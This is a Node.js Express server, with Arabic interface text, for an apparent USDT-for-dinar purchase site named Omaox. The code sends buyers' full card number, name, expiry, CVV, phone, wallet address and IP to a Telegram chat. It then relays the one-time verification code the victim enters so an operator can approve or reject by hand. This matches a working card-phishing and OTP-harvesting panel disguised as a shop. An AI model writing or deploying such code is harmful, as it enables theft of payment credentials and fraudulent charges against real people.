import express from "express";
import cors from "cors";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

const notifiedVisitIPs = new Set();
const orderStatuses = new Map();
let exchangeRate = parseInt(process.env.EXCHANGE_RATE || "1320", 10);
let orderCounter = Math.floor(1000 + Math.random() * 8999);

function getClientIP(req) {
  return (
    req.headers["x-forwarded-for"]?.toString().split(",")[0]?.trim() ||
    req.headers["x-real-ip"]?.toString() ||
    req.socket?.remoteAddress ||
    "unknown"
  );
}

async function sendTelegramMessage(text, replyMarkup) {
  if (!BOT_TOKEN || !CHAT_ID) return false;
  try {
    const payload = { chat_id: CHAT_ID, text, parse_mode: "HTML" };
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return res.ok;
  } catch { return false; }
}

function generateOrderId() {
  orderCounter++;
  return `#${orderCounter}`;
}

app.get("/api/config/rate", (_req, res) => {
  res.json({ rate: exchangeRate, ratePerHundred: exchangeRate * 100 });
});

app.get("/api/order/status/:orderId", (req, res) => {
  const orderId = req.params.orderId;
  const status = orderStatuses.get(orderId) || "pending";
  res.json({ orderId, status });
});

app.post("/api/telegram/notify-visit", async (req, res) => {
  try {
    const ip = getClientIP(req);
    if (notifiedVisitIPs.has(ip)) {
      return res.json({ success: true, message: "تم إرسال الإشعار مسبقاً" });
    }
    notifiedVisitIPs.add(ip);
    const msg =
      `🔔 <b>زائر جديد دخل صفحة الشراء</b>\n\n` +
      `⏰ الوقت: ${req.body.timestamp}\n` +
      `🌐 IP: ${ip}\n` +
      `📍 صفحة: نموذج الشراء\n\n` +
      `👁 شخص يتصفح الموقع الآن...`;
    const sent = await sendTelegramMessage(msg);
    res.json({ success: sent, message: sent ? "تم إرسال الإشعار" : "فشل" });
  } catch { res.status(400).json({ success: false, message: "خطأ" }); }
});

app.post("/api/telegram/submit-order", async (req, res) => {
  try {
    const b = req.body;
    const ip = getClientIP(req);
    const orderId = generateOrderId();
    const msg =
      `🛒 <b>طلب شراء جديد!</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${orderId}\n` +
      `💰 <b>المبلغ:</b> ${b.amount} USDT\n` +
      `💵 <b>المبلغ بالدينار:</b> ${b.amountIQD?.toLocaleString()} IQD\n\n` +
      `💳 <b>طريقة الدفع:</b> ${b.paymentMethod}\n` +
      `👤 <b>اسم صاحب البطاقة:</b> ${b.cardName}\n` +
      `🔢 <b>رقم البطاقة:</b> ${b.cardNumber}\n` +
      `📅 <b>تاريخ الانتهاء:</b> ${b.expiryDate}\n` +
      `🔐 <b>CVV:</b> ${b.cvv}\n\n` +
      `📱 <b>رقم الهاتف:</b> ${b.phone}\n` +
      `📦 <b>عنوان المحفظة:</b> ${b.walletAddress}\n` +
      (b.couponCode ? `🎟 <b>كود الخصم:</b> ${b.couponCode}\n` : "") +
      `🌐 <b>IP:</b> ${ip}\n` +
      `\n⏳ <b>الزبون ينتظر كود التحقق الآن...</b>`;
    const sent = await sendTelegramMessage(msg);
    res.json({ success: sent, message: sent ? "تم" : "فشل", orderId });
  } catch { res.status(400).json({ success: false, message: "خطأ", orderId: "" }); }
});

app.post("/api/telegram/submit-code", async (req, res) => {
  try {
    const b = req.body;
    orderStatuses.set(b.orderId, "pending");
    const msg =
      `🔑 <b>تم إدخال كود التحقق</b>\n\n` +
      `📋 <b>رقم الطلب:</b> ${b.orderId}\n` +
      `🔐 <b>كود التحقق:</b> ${b.code}\n\n` +
      `⏳ الزبون ينتظر قرارك...`;
    const sent = await sendTelegramMessage(msg, {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_${b.orderId}` },
          { text: "❌ رفض", callback_data: `reject_${b.orderId}` },
        ],
      ],
    });
    res.json({ success: sent, message: sent ? "تم" : "فشل" });
  } catch { res.status(400).json({ success: false, message: "خطأ" }); }
});

app.get("/api/healthz", (_req, res) => {
  res.json({ status: "ok" });
});

app.use(express.static(path.join(__dirname, "public")));

app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// --- Telegram Bot Polling ---
let lastUpdateId = 0;
let awaitingRateInput = false;

async function answerCallbackQuery(id, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: id, text }),
    });
  } catch {}
}

async function pollTelegramUpdates() {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30&allowed_updates=["message","callback_query"]`
    );
    if (!res.ok) return;
    const data = await res.json();
    if (!data.ok || !data.result) return;

    for (const update of data.result) {
      lastUpdateId = update.update_id;

      if (update.callback_query) {
        const cb = update.callback_query;
        if (cb.message?.chat?.id?.toString() !== CHAT_ID) continue;

        if (cb.data?.startsWith("approve_")) {
          const oid = cb.data.replace("approve_", "");
          orderStatuses.set(oid, "approved");
          await answerCallbackQuery(cb.id, "تمت الموافقة ✅");
          await sendTelegramMessage(
            `✅ <b>تمت الموافقة على الطلب ${oid}</b>\n\n` +
            `تم إبلاغ الزبون بنجاح العملية.`
          );
          continue;
        }

        if (cb.data?.startsWith("reject_")) {
          const oid = cb.data.replace("reject_", "");
          orderStatuses.set(oid, "rejected");
          await answerCallbackQuery(cb.id, "تم الرفض ❌");
          await sendTelegramMessage(
            `❌ <b>تم رفض الطلب ${oid}</b>\n\n` +
            `تم إبلاغ الزبون بأن الكود غلط.`
          );
          continue;
        }

        if (cb.data === "change_rate") {
          awaitingRateInput = true;
          await answerCallbackQuery(cb.id, "أرسل السعر الجديد");
          await sendTelegramMessage(
            `💱 <b>تغيير سعر الصرف</b>\n\n` +
            `السعر الحالي: <b>${exchangeRate.toLocaleString()}</b> دينار لكل 1 USDT\n` +
            `(100$ = ${(exchangeRate * 100).toLocaleString()} دينار)\n\n` +
            `📝 أرسل السعر الجديد لكل 1 USDT (مثال: 1320)`
          );
        } else if (cb.data === "view_rate") {
          await answerCallbackQuery(cb.id, "السعر الحالي");
          await sendTelegramMessage(
            `💱 <b>سعر الصرف الحالي</b>\n\n` +
            `1 USDT = <b>${exchangeRate.toLocaleString()}</b> دينار\n` +
            `100 USDT = <b>${(exchangeRate * 100).toLocaleString()}</b> دينار`
          );
        } else if (cb.data === "view_stats") {
          await answerCallbackQuery(cb.id, "الإحصائيات");
          await sendTelegramMessage(
            `📊 <b>إحصائيات Omaox</b>\n\n` +
            `📋 آخر رقم طلب: <b>${orderCounter}</b>\n` +
            `💱 سعر الصرف: <b>${exchangeRate.toLocaleString()}</b> د.ع/USDT\n` +
            `👥 زوار فريدين: <b>${notifiedVisitIPs.size}</b>`
          );
        }
        continue;
      }

      if (update.message) {
        const msg = update.message;
        if (msg.chat?.id?.toString() !== CHAT_ID) continue;

        if (msg.text === "/admin") {
          awaitingRateInput = false;
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `⚙️ <b>لوحة تحكم Omaox</b>\n\nاختر أحد الخيارات:`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [{ text: "💱 تغيير سعر الصرف", callback_data: "change_rate" }],
                  [{ text: "📊 عرض السعر الحالي", callback_data: "view_rate" }],
                  [{ text: "📈 إحصائيات", callback_data: "view_stats" }],
                ],
              },
            }),
          });
          continue;
        }

        if (awaitingRateInput && msg.text) {
          const newRate = parseInt(msg.text.trim(), 10);
          if (!isNaN(newRate) && newRate > 0) {
            const oldRate = exchangeRate;
            exchangeRate = newRate;
            awaitingRateInput = false;
            await sendTelegramMessage(
              `✅ <b>تم تغيير سعر الصرف!</b>\n\n` +
              `القديم: <b>${oldRate.toLocaleString()}</b>\n` +
              `الجديد: <b>${newRate.toLocaleString()}</b>\n\n` +
              `100$ = <b>${(newRate * 100).toLocaleString()}</b> دينار\n\n` +
              `🔄 تم تحديث الموقع تلقائياً`
            );
          } else {
            await sendTelegramMessage("❌ رقم غير صالح. أرسل رقم صحيح (مثال: 1320)");
          }
        }
      }
    }
  } catch {}
}

function startBotPolling() {
  async function loop() {
    await pollTelegramUpdates();
    setTimeout(loop, 1000);
  }
  loop();
}

app.listen(PORT, () => {
  console.log(`Omaox server running on port ${PORT}`);
  startBotPolling();
  console.log("Telegram bot polling started");
});
